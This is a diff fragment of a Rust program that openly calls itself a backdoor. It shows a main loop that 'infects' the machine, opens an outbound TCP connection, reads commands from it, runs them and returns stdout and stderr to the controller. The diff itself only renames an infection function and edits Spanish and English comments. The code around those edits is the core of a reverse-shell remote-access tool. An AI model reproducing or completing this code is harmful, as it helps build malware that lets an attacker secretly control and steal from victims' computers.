@@ -5,10 +5,10 @@ mod backdoor;
 
 
 fn main() -> std::io::Result<()> {
-    backdoor::infect::infect_pc();
+    backdoor::infect::start_infection();
     let mut stream: TcpStream = backdoor::start_connection::establish_connection(10);
     loop {
-        let mut data = [0; 1024];//hay que tener esto para manejar una gran cantidad de datos , con 6 bytes no basta ya que solo te da una salida de 6 caracteres
+        let mut data = [0; 1024];// hay que tener esto para manejar una gran cantidad de datos , con 6 bytes no basta ya que solo te da una salida de 6 caracteres
         match stream.read(&mut data) {
             Ok(_) => {
 
@@ -21,7 +21,7 @@ fn main() -> std::io::Result<()> {
                     let mut r = result.unwrap();
 
                     let result_vec = &mut r.stdout;
-                    result_vec.push(10); // Insert a \n so it isn't at the same level as the stderr
+                    result_vec.push(10); // inserta /n para que el stdout y el stderr no se vea todo junto
                     result_vec.append(&mut r.stderr);
 
                     let t_s = &result_vec.as_slice()[..];
